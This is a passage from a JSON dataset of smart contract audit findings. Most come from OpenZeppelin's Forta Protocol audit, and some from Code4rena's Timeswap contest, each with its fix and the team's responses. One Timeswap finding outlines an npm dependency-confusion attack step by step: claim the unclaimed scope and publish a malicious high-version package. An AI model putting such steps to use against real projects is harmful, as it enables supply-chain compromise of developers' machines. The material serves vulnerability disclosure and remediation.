      "content": "When a certain subject under-performed or has done actions against the correct operation of the protocol, the `SLASHER_ROLE` role can slash that subject and all the users that have staked on it by calling the [`slash` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L286) from the `FortaStaking` contract. After the [value that should be taken from inactive and active stake is computed](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L299-L300), the slashed funds are [transferred to the `_treasury` address](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L305).\n\n\nHowever, if the `_treasury` address is being set as zero either during the [initialization](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L117) of the contract or by the `DEFAULT_ADMIN_ROLE` role with the [`setTreasury` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L493), the whole slashing mechanism will not work because the `FORT` token [does not allow to transfer tokens to the zero address](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.4.2/contracts/token/ERC20/ERC20Upgradeable.sol#L233).\n\n\nIn order to prevent the possible reversion of the slashing process, consider always validating that the `_treasury` address is not zero when initializing the contract or when a new treasury address is being set.\n\n\n***Update:** Fixed on [commit `b2c4d5aa398530d1ae5af14cf84eb438a377af5e` in pull request 56](https://github.com/forta-protocol/forta-token/pull/56/commits/b2c4d5aa398530d1ae5af14cf84eb438a377af5e).*",
      "summary": "\nThis bug report is about the FortaStaking contract from the Forta protocol. The SLASHER_ROLE role has the ability to slash a subject and all the users that have staked on it by calling the slash function. The value that should be taken from inactive and active stake is calculated and the slashed funds are transferred to the _treasury address.\n\nHowever, if the _treasury address is set as zero either during the initialization of the contract or by the DEFAULT_ADMIN_ROLE role with the setTreasury function, the slashing mechanism will not work because the FORT token does not allow to transfer tokens to the zero address.\n\nIn order to prevent this potential issue, it is necessary to validate that the _treasury address is not zero when initializing the contract or when a new treasury address is being set. This issue has been fixed on commit b2c4d5aa398530d1ae5af14cf84eb438a377af5e in pull request 56.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10589",
      "title": "L2 tokens could get stuck",
      "impact": "MEDIUM",
      "content": "The [`release` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L118) in the `StakingEscrow` contract allows users to send tokens from the `StakingEscrow` contract to another account on L2. However, in order to preserve the vesting schedule, FORT tokens are NOT allowed to be transferred unless they have been [accounted for by `pendingReward`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L119-L121).\n\n\nTypically if tokens are received as rewards from the staking contract, `pendingReward` will be increased. However, if tokens are sent directly to this contract, it will not increase `pendingReward` and the tokens will not be transferable. Instead, users will only be able to [`bridge`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L148-L150) their FORT tokens, subjecting them to the vesting schedule on L1.\n\n\nConsider implementing some accounting to allow for users to transfer FORT tokens to this contract, and afterwards transfer them out via the [`release` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L118). Alternatively, consider making a clear warning to any `StakingEscrow` contract users that FORT tokens transferred to the contract will not be `release`-able and will be subjected to vesting.\n\n\n***Update:** Fixed on [commit `9d821024623005808eddd6765d8260f1d2a2301d` in pull request 55](https://github.com/forta-protocol/forta-token/pull/55/commits/9d821024623005808eddd6765d8260f1d2a2301d). A warning has been added to let users know about this behavior.*",
      "summary": "\nThis bug report is about the `release` function in the `StakingEscrow` contract. This function allows users to send tokens from the `StakingEscrow` contract to another account on L2. However, in order to preserve the vesting schedule, FORT tokens are not allowed to be transferred unless they have been accounted for by `pendingReward`. This happens when tokens are received as rewards from the staking contract, and `pendingReward` is increased. If tokens are sent directly to this contract, it will not increase `pendingReward` and the tokens will not be transferable. \n\nIn order to solve this issue, the developers considered implementing some accounting to allow for users to transfer FORT tokens to this contract, and afterwards transfer them out via the `release` function. Alternatively, they considered making a clear warning to any `StakingEscrow` contract users that FORT tokens transferred to the contract will not be `release`-able and will be subjected to vesting. The bug has been fixed on commit `9d821024623005808eddd6765d8260f1d2a2301d` in pull request 55. A warning has been added to let users know about this behavior.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10588",
      "title": "Staked funds might get soft-stuck",
      "impact": "MEDIUM",
      "content": "The [`FortaStaking` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L45) implements the functionality to allow holders to stake their funds (vested or not) into a subject and collect rewards by doing so. The contract uses 2 different accounting systems to handle the assets: a [`Distribution` type based for the asset in stake units](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L53-L56) and the inner [ERC1155 accounting system](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L45) for the associated shares. When a user [stakes](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L201), the contract [mints new active shares](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L213). When a user [wants to withdraw](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L224), the contract [burns those active shares](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L241) and [mints inactive ones](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L242).\n\n\nWhen minting these ERC1155, the [`_doSafeTransferAcceptanceCheck` hook](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.4.2/contracts/token/ERC1155/ERC1155Upgradeable.sol#L421) will get triggered and it would check if the destinatary is a `ERC1155Receiver` implementer or not when it detects that the address has code in it.\n\n\nHowever, if the minting process happens during the constructor of a non-fully compatible ERC1155 wallet, the `FortaStaking` contract would treat the destinatary as a regular EOA during the minting process. Then, once it is deployed, the wallet will not be able to mint new shares due to the same `_doSafeTransferAcceptanceCheck` hook as it will get triggered, failing at the same validation that was skipped on the first deposit.\n\n\nThis means that when the wallet [starts the process to withdraw the assets](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L224), the transaction will fail during the [minting of inactive shares](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L242). Nevertheless, the user may transfer those active shares to a fully compatible wallet to then initiate the withdrawal process once again.\n\n\nIn favor of improving the usability of the protocol, consider documenting the requirements that 3rd party wallets would need to be able to fully interact with it either during the deployment stage or once it has been deployed.\n\n\n***Update:** Fixed on [commit `d13be24e8b84ffc59eb04ded2d03841a69996434` in pull request 54](https://github.com/forta-protocol/forta-token/pull/54/commits/d13be24e8b84ffc59eb04ded2d03841a69996434).*",
      "summary": "\nThe FortaStaking contract implements the functionality to allow holders to stake their funds into a subject and collect rewards. It uses two different accounting systems to handle the assets: a Distribution type based for the asset in stake units and the inner ERC1155 accounting system for the associated shares. When a user stakes, the contract mints new active shares. When a user wants to withdraw, the contract burns those active shares and mints inactive ones. \n\nHowever, if the minting process happens during the constructor of a non-fully compatible ERC1155 wallet, the FortaStaking contract would treat the destinatary as a regular EOA during the minting process. Then, once it is deployed, the wallet will not be able to mint new shares due to the _doSafeTransferAcceptanceCheck hook as it will get triggered, failing at the same validation that was skipped on the first deposit. This means that when the wallet starts the process to withdraw the assets, the transaction will fail during the minting of inactive shares. \n\nIn order to improve the usability of the protocol, consider documenting the requirements that 3rd party wallets would need to be able to fully interact with it either during the deployment stage or once it has been deployed. The issue has been fixed on commit d13be24e8b84ffc59eb04ded2d03841a69996434 in pull request 54.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10587",
      "title": "Lack of validation",
      "impact": "MEDIUM",
      "content": "Throughout the codebase, there are places where a proper input/output validation is lacking. In particular:\n\n\n* In the [`Router` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L14), when [adding](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L44) or [removing](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L46) an element from the routing table, the methods return a boolean to inform the success of the call, but this output is never used or validated by the `Router` contract.\n* Similarly to the case from above, in the [`ScannerRegistryManaged` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryManaged.sol#L8), when [adding](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryManaged.sol#L37) or [removing](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryManaged.sol#L39) a manager from storage, its method’s output is never validated.\n* In [`Routed.sol`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/Routed.sol#L7), the variable assignment in lines [13](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/Routed.sol#L13) and [25](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/Routed.sol#L25) are not validating if the address corresponds to a contract or if it is the zero address.\n* In the [`FortaStaking` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L45) it is possible to [initiate a withdrawal](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L224) and [set in storage a deadline](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L233) for a inexistent stake, [emit several events](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L241-L244) during the process, and [trigger an external hook](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L246).\n\n\nA lack of validation on user-controlled parameters may result in erroneous or failing transactions that are difficult to debug. To avoid this, consider adding input and output validation to address the concerns raised above and in any other place when appropriate.\n\n\n***Update:** Partially fixed on [commit `85d6bd7518efd3a759789225b7dc07d4c26fa7fd` in pull request 53](https://github.com/forta-protocol/forta-token/pull/53/commits/85d6bd7518efd3a759789225b7dc07d4c26fa7fd). The team has acknowledged the lack of validation but it will not be enforced on all the mentioned places. The team’s response for the issue:*\n\n\n\n> *NOTE: ignoring EnumerableSet.add() bool output; We don’t care if already added.*\n> \n>",
      "summary": "\nThis bug report is about the lack of input/output validation in the codebase of the Forta Token. In particular, the methods in the `Router` and `ScannerRegistryManaged` contracts do not validate the boolean output when adding or removing elements from the routing table or storage. The `Routed.sol` contract does not validate if the address corresponds to a contract or if it is the zero address. The `FortaStaking` contract does not check if a stake exists before initiating a withdrawal and setting a deadline in storage.\n\nThe lack of validation on user-controlled parameters could lead to erroneous or failing transactions that are difficult to debug. To prevent this, input and output validation should be added to the codebase. The team has partially fixed the issue on `85d6bd7518efd3a759789225b7dc07d4c26fa7fd` commit in pull request 53, but the team has decided to ignore the boolean output of the `EnumerableSet.add()` method.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10586",
      "title": "Unclear initialization of inherited contracts",
      "impact": "MEDIUM",
      "content": "The [`StakeAwareUpgradeable` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/StakeAware.sol#L9) is inherited by a few contracts, such as the [`ScannerRegistryEnable` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L9), and therefore any other contract that inherits from those, such as the [`ScannerRegistry` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistry.sol#L11).\n\n\nHowever, even though the `ScannerRegistry` contract implements the [`initialize` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistry.sol#L22) that initializes [all the respective imports](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistry.sol#L28-L31), there is no call to the [`__StakeAwareUpgradeable_init` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/utils/StakeAware.sol#L14) from the `StakeAwareUpgradeable` contract. Furthermore, there is no single location in the whole codebase that would call the initializer to set the respective stake controller.\n\n\nMoreover, the [`FortaStaking` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L45) is inheriting the functionalities from the [`ERC1155SupplyUpgradeable` contract](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/06ab69e525435f2f4487e72676522fda670244cb/contracts/token/ERC1155/extensions/ERC1155SupplyUpgradeable.sol#L17) but its [`__ERC1155Supply_init` function](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/06ab69e525435f2f4487e72676522fda670244cb/contracts/token/ERC1155/extensions/ERC1155SupplyUpgradeable.sol#L18) is never initialized.\n\n\nConsider calling all the respective initialization functions when inheriting functionalities from other contracts.\n\n\n***Update:** Fixed on [commit `b7f5eb26fdb87a5c45392d6a6468d873a86ea450` in pull request 52](https://github.com/forta-protocol/forta-token/pull/52/commits/b7f5eb26fdb87a5c45392d6a6468d873a86ea450). More documentation was added to describe the lack of initialization on upgraded contracts.*",
      "summary": "\nThis bug report is about a few contracts, such as the StakeAwareUpgradeable and ScannerRegistryEnable, that are inherited by other contracts, like the ScannerRegistry. The ScannerRegistry implements the initialize function, which initializes all the imports, but there is no call to the __StakeAwareUpgradeable_init function from the StakeAwareUpgradeable contract. Additionally, the FortaStaking contract, which inherits from the ERC1155SupplyUpgradeable contract, does not have the __ERC1155Supply_init function initialized. To fix this issue, it is suggested to call all the respective initialization functions when inheriting functionalities from other contracts. This issue has been fixed on the commit b7f5eb26fdb87a5c45392d6a6468d873a86ea450 in pull request 52 and more documentation has been added to describe the lack of initialization on upgraded contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10585",
      "title": "Lack of event emission after sensitive actions",
      "impact": "MEDIUM",
      "content": "The following function do not emit relevant events after executing sensitive actions.\n\n\n* The [`sweep` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L348) of the `FortaStaking` contract, after the `SWEEPER_ROLE` role withdraws all mistakenly sent tokens to the contract.\n\n\nConsider emitting events after sensitive changes take place (including the first event emission in the constructor when appropriate), to facilitate tracking and notify off-chain clients following the contracts’ activity\n\n\n***Update:** Fixes on [commit `d0934556c8331ccb806a606622bbd8b9f10c301b` in pull request 51](https://github.com/forta-protocol/forta-token/pull/51/commits/d0934556c8331ccb806a606622bbd8b9f10c301b).*",
      "summary": "\nThis bug report is about an issue with the `sweep` function of the `FortaStaking` contract. When the `SWEEPER_ROLE` role withdraws all mistakenly sent tokens to the contract, no relevant events are emitted. This could make it difficult to track and notify off-chain clients following the contracts’ activity. To fix the issue, the commit `d0934556c8331ccb806a606622bbd8b9f10c301b` in pull request 51 was implemented. This commit ensures that events are emitted after sensitive changes take place, including the first event emission in the constructor when appropriate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10584",
      "title": "__gap missing in upgradeable contracts",
      "impact": "MEDIUM",
      "content": "The contracts [`VestingWallet`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/VestingWallet.sol) and [`VestingWalletV2`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/VestingWalletV2.sol) do not contain a `__gap` variable although they are upgradeable.\n\n\nConsider adding a correct `__gap` variable to these contracts, or documenting a plan for managing storage collisions when upgrading the Vesting Wallet. Additionally, since upgradeable contracts with `__gap`s are used in many places within the contracts, consider implementing quality control steps for upgradeable contract development. For instance, make it a priority to check all `__gap` variables before pushing any new code commits, as well as leaving comments next to all variables in a contract indicating which storage slots they belong in. Consider leaving deprecated variables in the code, and leaving comments about the fact that they were deprecated to avoid confusion for future developers. Finally, consider implementing a predictable inheritance structure for all contracts and documenting it within each contract. Implementing these steps will reduce the surface for error and in the long run may save developer time by removing confusion about the storage layout of the contracts.\n\n\n***Update:** Fixed on [commit `9b37ac5d4b852954552c69e33bf7f35de051d5b3` in pull request 50](https://github.com/forta-protocol/forta-token/pull/50/commits/9b37ac5d4b852954552c69e33bf7f35de051d5b3). The original `VestingWallet` contract without upgradeability slots was kept as the `VestingWalletV0` contract and further extensions of it now include the `__gap` slots variable.*",
      "summary": "\nThis bug report discusses two contracts, VestingWallet and VestingWalletV2, which are upgradeable but do not contain a __gap variable. A __gap variable is necessary to manage storage collisions when upgrading the Vesting Wallet. To prevent errors, the report suggests implementing quality control steps such as checking all __gap variables before pushing code commits, leaving comments next to variables, and implementing a predictable inheritance structure for all contracts. The bug was fixed in commit 9b37ac5d4b852954552c69e33bf7f35de051d5b3 in pull request 50. The original VestingWallet contract without upgradeability slots was kept as the VestingWalletV0 contract and further extensions of it now include the __gap slots variable.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10583",
      "title": "Malicious user can register a scanner under any owner",
      "impact": "HIGH",
      "content": "The [`ScannerRegistryCore` contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryCore.sol#L8) implements the functionality to allow the registration and minting of new scanners.\n\n\nNew scanners are meant to be registered by either calling the [`register` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryCore.sol#L27) from the scanner’s address or through the trusted forwarder, or by the admin when calling the [`adminRegister` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryCore.sol#L19). These functions then call the [`_register` function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryCore.sol#L31) which implements the rest of the registration.\n\n\nHowever, this `_register` function is marked as a `public` function, meaning that any user could skip the checks and register a scanner in the same way as the admin does it.\n\n\nIn favor of restricting the admin functionalities to regular users, consider changing the visibility of the `_register` function to `internal`.\n\n\n***Update:** Fixed on [commit `11bb25a9034f19be44315203713bf94d138698b8` in pull request 49](https://github.com/forta-protocol/forta-token/pull/49/commits/11bb25a9034f19be44315203713bf94d138698b8).*",
      "summary": "\nThe ScannerRegistryCore contract is used to register and mint new scanners. These functions are meant to be called by either the scanner’s address, the trusted forwarder, or the admin. However, the _register function was marked as public, meaning that any user could register a scanner in the same way as the admin. To prevent this, the visibility of the _register function was changed to internal. This issue has been fixed in commit 11bb25a9034f19be44315203713bf94d138698b8 in pull request 49.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "25652",
      "title": "[L-01] CollateralizedDebt.tokenURI fails when pair's asset or collateral token have low decimals",
      "impact": "LOW",
      "content": "\n[NFTTokenURIScaffold.sol#L166](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L166)<br>\n\nStandard ERC721 tokenURI call will fail for CollateralizedDebt pools whose underlying pair.asset() or pair.collateral() have decimals lower than 4 whenever the corresponding due quantity is lower than 1e9.\n\nPair's asset and collateral ERC20 can be arbitrary and some ERC20 contracts have decimals lower than 4, so such a combination is possible. In such cases current tokenURI implementation fails, which can be the issue for all integrations down the line as various systems routinely make tokenURI calls.\n\nPlacing severity to be medium per 'Assets not at direct risk, but the function of the protocol or its availability could be impacted', which is the case here as protocol availability is in question when EIP level functionality fails.\n\n### References\n\n<https://eips.ethereum.org/EIPS/eip-721>\n\n<https://github.com/d-xo/weird-erc20#low-decimals>\n\n### Proof of Concept\n\nNFTTokenURIScaffold.weiToPrecisionString will fail if used for a token with decimals lower than 4 as subtraction is performed without prior checks:\n\n[NFTTokenURIScaffold.sol#L166](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L166)<br>\n\nNFTTokenURIScaffold.weiToPrecisionString is called by NFTTokenURIScaffold.tokenURI for pair's asset and collateral ERC20:\n\n[NFTTokenURIScaffold.sol#L16-L39](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L16-L39)<br>\n\nNFTTokenURIScaffold.tokenURI is used in CollateralizedDebt.tokenURI:\n\n[CollateralizedDebt.sol#L46](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/CollateralizedDebt.sol#L46)<br>\n\nPair's asset and collateral tokens can be arbitrary, while tokenURI is routinely requested by a variety of external systems\n\n### Recommended Mitigation Steps\n\nConsider adding the check and special care for low decimals case, for example add another naming rule similarly to how `significantDigits > 1e9` case is being handled\n\n**[amateur-dev (Timeswap) confirmed](https://github.com/code-423n4/2022-03-timeswap-findings/issues/33)**\n\n**[vhawk19 (Timeswap) commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/33#issuecomment-1066298800):**\n > Have tested with zero decimals, yields in desired output as expected.\n> <img width=\"1665\" alt=\"Screenshot 2022-03-14 at 8 47 16 AM\" src=\"https://user-images.githubusercontent.com/24829996/158098919-ff03f04e-821f-4b4d-b534-1d60f67ab32d.png\">\n\n**[Mathepreneur (Timeswap) resolved](https://github.com/code-423n4/2022-03-timeswap-findings/issues/33)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/33#issuecomment-1086577584):**\n > Am I correct in understanding that `weiAmt` is denominated using 18 decimals and not the `decimal` value provided as an input to the `weiToPrecisionString()` function? I'm curious as to why this is not an issue.\n\n**[amateur-dev (Timeswap) commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/33#issuecomment-1110648536):**\n > Hi, we are aware of the issue highlighted.  We have taken a conscious call for the decimals.  We have done testing and confirm that our lend, borrow and similar transactions do not have an issue.  The issue only arises once we call the URI of tokens with less than 4 decimals.  In that sense, these tokens URI will not show up properly in opensea.  The exposure is limited to that.  We do not rely on that URI for any function call in our dapp.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/33#issuecomment-1112275217):**\n > As per the sponsor's comment, this issue only pertains to a token's URI which is shown in opensea. The unlikely edge case raised by the warden should only occur when tokens with less than 4 decimals are used. Because of the limited exposure to an attack, I'm inclined to mark this as `1 (Low Risk)`.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-03-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25651",
      "title": "[M-03] NPM Dependency confusion. Unclaimed NPM Package and Scope/Org",
      "impact": "MEDIUM",
      "content": "_Submitted by ch13fd357r0y3r_\n\nI discovered an npm package and the scope of the package is unclaimed on the NPM website. This will give any User to claim that package and be able to Upload a Malicious Code under that unclaimed package. This results in achieving the Remote code execution on developers/users' machine who depends on the timeswap repository to build it on local env.\n\nVulnerable Package Name: @timeswap-labs/timeswap-v1-core\n\n### Proof of Concept\n\n1.  Create an Organization called \"timeswap-labs\".\n2.  Create a package called \"@timeswap-labs/timeswap-v1-core\" under \"timeswap-labs\" Organization.\n3.  Attacker can able to upload malicious code on unclaimed npm package with a higher version like 99.99.99\n4.  Now if any user/timeswap developer installs it by npm install package.json. The malicious pkg will be executed.\n\nTill now \"The Package is not claimed on NPM Registry, but it's vulnerable to dependency confusion\".\nYou can read more dependency confusion here: <https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/>\n\n### Recommended Mitigation Steps\n\nClaim the Scope name called \"timeswap-labs\" by following the above POC Step 1.\n\n**[amateur-dev (Timeswap) confirmed and commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/9#issuecomment-1063795498):**\n > Created the organisation.  Thank you.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/9#issuecomment-1087500908):**\n > I think this is an interesting attack vector and useful find!\n>\n> I would normally mark findings unrelated to Solidity code as `invalid`, however, I think the issue here raises an interesting exploit where an attacker could inject malicious code into a smart contract dependency. As such, I think this is relevant and a valid attack path.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an npm package called \"@timeswap-labs/timeswap-v1-core\" which is unclaimed on the NPM website. This means that any user can claim the package and upload malicious code under the package, leading to remote code execution on the machines of developers/users who depend on the timeswap repository. \n\nTo prove this vulnerability, the bug reporter outlines a proof of concept which involves creating an organization called \"timeswap-labs\" and then creating a package under it called \"@timeswap-labs/timeswap-v1-core\". The attacker can then upload malicious code with a higher version like 99.99.99. If any user or timeswap developer installs this package, the malicious code will be executed.\n\nThe recommended mitigation step is to claim the scope name called \"timeswap-labs\" by following the proof of concept step 1. The bug report was confirmed and commented on by amateur-dev (Timeswap) and 0xleastwood (judge). The judge commented that this is an interesting attack vector and a valid attack path.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-03-timeswap",
      "github_link": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/9",
      "tags": [],
      "finders": []
    },
    {
      "id": "25650",
      "title": "[M-02] The `pay()` function can still be DOSed",
      "impact": "MEDIUM",
